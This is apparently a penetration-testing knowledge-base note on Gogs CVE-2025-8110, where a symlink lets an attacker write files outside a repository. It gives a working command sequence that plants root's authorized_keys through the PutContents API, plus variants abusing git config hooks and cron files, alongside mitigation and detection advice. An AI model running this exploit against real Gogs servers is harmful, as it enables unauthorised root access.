---
topic: Gogs — out-of-repository write through a symlink (CVE-2025-8110)
tags: [web, gogs, symlink, git, rce, cve-2025-8110]
---

# Gogs — out-of-repository write through a symlink (CVE-2025-8110)

**English** | [🌐 Español](gogs-symlink-rce.md)

## Concept

Gogs' `PutContents` API wrote files inside a repository but followed symlinks. A repository with a link to `/root/.ssh` allows writing `authorized_keys` outside the project tree. The write happens before the commit fails, so the later error does not prevent access.

## When it applies

- Gogs is exposed and allows repository creation and tokens.
- The instance runs as root or can access sensitive paths.
- The version predates the CVE-2025-8110 fix.

## Procedure

1. Create an account and your own repository.
2. Add a symlink pointing outside the repository.
3. Commit and push the symlink.
4. Use the `PutContents` API with a token to write an SSH key through the linked path.

## Commands

```bash
git clone http://<USER>:<PASS>@<HOST>:3001/<USER>/repo.git
cd repo && ln -s /root/.ssh sshdir
git add sshdir && git commit -m link && git push
base64 -w0 ~/.ssh/id_ed25519.pub
curl -X PUT http://<HOST>:3001/api/v1/repos/<USER>/repo/contents/sshdir/authorized_keys \
  -H "Authorization: token <TOKEN>" -H "Content-Type: application/json" \
  -d '{"message":"x","content":"<BASE64>"}'
```

## Variants

- Target `.git/config` and abuse `sshCommand` or `core.fsmonitor`.
- Write a cron job or service configuration file.
- Use relative components that resolve outside the repository.

## Limitations

- Gogs must have permissions on the destination.
- The API requires a valid token and write access.
- The fixed version resolves symlinks before writing.

## Mitigation

- Update Gogs to 0.13.4 or later.
- Resolve paths with `realpath` and reject symlinks outside the repository.
- Do not run Gogs as root and isolate its repositories.

## Detection

- Repositories containing symlinks to `/root`, `/etc` or configuration paths.
- `PUT` calls to `contents` with paths that include links.
- New SSH keys in root's `authorized_keys`.

## References

- [0xdf — Silentium](https://0xdf.gitlab.io/2026/09/12/htb-silentium.html)
- [NVD — CVE-2025-8110](https://nvd.nist.gov/vuln/detail/CVE-2025-8110)
- [CWE-59 — Improper Link Resolution](https://cwe.mitre.org/data/definitions/59.html)
